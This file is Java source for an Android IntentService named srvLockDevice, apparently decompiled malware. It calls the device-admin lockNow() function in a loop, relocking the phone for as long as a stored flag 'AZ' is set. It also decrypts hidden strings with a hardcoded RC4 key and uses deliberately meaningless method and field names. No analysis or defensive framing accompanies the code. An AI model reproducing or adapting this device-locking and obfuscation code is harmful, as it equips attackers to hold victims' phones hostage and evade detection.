package com.example.mmm.Service;

import android.app.*;
import com.example.mmm.Utils.*;
import com.example.mmm.*;
import com.example.mmm.API.*;
import android.util.*;
import android.content.*;
import android.app.admin.*;

public class srvLockDevice extends IntentService
{
    utils optics$;
    constants google$;
    
    public srvLockDevice() {
        super("");
        this.optics$ = new utils();
        this.google$ = new constants();
    }
    
    private String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    protected void onHandleIntent(final Intent \u0131ntent) {
        do {
            utils.chalkTile(10);
            final utils optics$ = this.optics$;
            ((DevicePolicyManager)((Context)this).getSystemService("device_policy")).lockNow();
            utils._pensions((Context)this);
        } while (this.optics$.SettingsRead((Context)this, "AZ").equals("1"));
        this.stopSelf();
    }
}
